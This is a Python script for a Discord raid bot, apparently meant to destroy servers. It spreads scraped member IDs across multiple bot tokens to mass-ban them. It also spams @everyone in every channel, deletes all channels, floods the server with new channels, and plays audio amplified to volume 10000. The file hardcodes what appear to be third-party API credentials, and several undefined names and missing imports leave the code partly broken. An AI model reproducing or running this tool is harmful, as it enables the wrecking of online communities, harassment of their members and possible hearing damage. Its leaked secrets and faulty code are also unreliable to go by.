import discord
from discord.ext import commands
import asyncio
import jishaku
import os
import random
BOT_TOKENS = []  
intents = discord.Intents.all()
intents.webhooks= True
intents.messages = True
async def create_bot(token, ids):
    bot = commands.Bot(command_prefix='!', intents=intents)
    bot.owner_ids = [1043194242476036107, 765865384011628574, 630616794033291267]
    await bot.load_extension("jishaku")

    @bot.command()
    @commands.is_owner()
    async def banall(ctx):
        guild = ctx.guild
        for member_id in ids:
            try:
                user = await bot.fetch_user(member_id)
                await guild.ban(user, reason="fcked")
                await ctx.send(f"Banned {user.name} (ID: {user.id})")
                print(f"Banned {user.name} (ID: {user.id})")
                ids.remove(member_id)
            except Exception as e:
                print(f"Failed to ban user with ID {member_id}: {e}")

    @bot.command()
    @commands.is_owner()
    async def ray(ctx, *, lund):
        async def send_message(channel, *, lund):
            for _ in range(150):
                await channel.send(f"@everyone @here {lund}")

        tasks = []
        for channel in ctx.guild.text_channels:
            task = asyncio.create_task(send_message(channel, lund))
            tasks.append(task)

        await asyncio.gather(*tasks)

    @bot.command()
    @commands.is_owner()
    async def delete(ctx):
        guild = ctx.guild
        channels = guild.text_channels

        random.shuffle(channels)

        for channel in channels:
            try:
                await channel.delete()
            except Exception as e:
                print(f"Error deleting channel {channel.name}: {e}")

    @bot.command()
    @commands.is_owner()
    async def join(ctx):
        if ctx.author.voice:
            channel = ctx.author.voice.channel
            voice_client = await channel.connect()
            await ctx.send(f'Joined {channel.name} successfully!')
        else:
            await ctx.send("You are not in a voice channel.")
    @tasks.loop(seconds=5)
    async def status_task():
            await bot.change_presence(status=discord.Status.do_not_disturb,activity=discord.activity.Game(name=next(status)))
    @bot.command()
    @commands.is_owner()
    async def leave(ctx):
        if ctx.voice_client:
            await ctx.voice_client.disconnect()
            await ctx.send("Left voice channel.")
        else:
            await ctx.send("I'm not in a voice channel.")

    @bot.command()
    @commands.is_owner()
    async def create(ctx, name):
        while True:
            try:
                await ctx.guild.create_text_channels(name=name)
            except:
                break

    @bot.command()
    async def play(ctx):
        
        if ctx.author.voice is None or ctx.author.voice.channel is None:
            await ctx.send("You are not in a voice channel.")
            return

      
        channel = ctx.author.voice.channel
        voice_client = await channel.connect()

        try:
           
            file_name = "ray.mp3"

            volume_filter = f"volume=10000"

      
            audio_source = discord.FFmpegPCMAudio(file_name, options=f"-af {volume_filter}")
            voice_client.play(audio_source)

            
            while voice_client.is_playing():
                await asyncio.sleep(1)

          
            await voice_client.disconnect()
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")

    @bot.event
    async def node_connect():
        await bot.wait_until_ready()
        node: wavelink.Node = wavelink.Node(uri='lavalink.oryzen.xyz:80', password='oryzen.xyz', secure=False)
        sc: spotify.SpotifyClient = spotify.SpotifyClient(
            client_id='e7c9c292bbc24745b33743348e560d96',
            client_secret='4726d6d6eba34cfe889c26844fcabc97'
        )
        await wavelink.NodePool.connect(client=bot, nodes=[node], spotify=sc)

    @bot.event
    async def on_ready():
        await bot.change_presence(status=discord.Status.do_not_disturb, activity=discord.Game(name=next(status)))
        try:
            print(f'{bot.user.name} logged successfully')
        except Exception as e:
            print(f"An error occurred in on_ready: {e}")

    status_task.start()
    await bot.start(token)
os.environ["JISHAKU_NO_DM_TRACEBACK"] = "True"
os.environ["JISHAKU_HIDE"] = "True"
os.environ["JISHAKU_NO_UNDERSCORE"] = "True"
os.environ["JISHAKU_FORCE_PAGINATOR"] = "True"

async def main():
    with open("scraped.txt", "r") as file:
        member_ids = [line.strip() for line in file]

    chunk_size = (len(member_ids) + len(BOT_TOKENS) - 1) // len(BOT_TOKENS)
    id_chunks = [member_ids[i:i + chunk_size] for i in range(0, len(member_ids), chunk_size)]

    bot_tasks = [create_bot(token, ids) for token, ids in zip(BOT_TOKENS, id_chunks)]
    await asyncio.gather(*bot_tasks)


if __name__ == '__main__':
    asyncio.run(main())
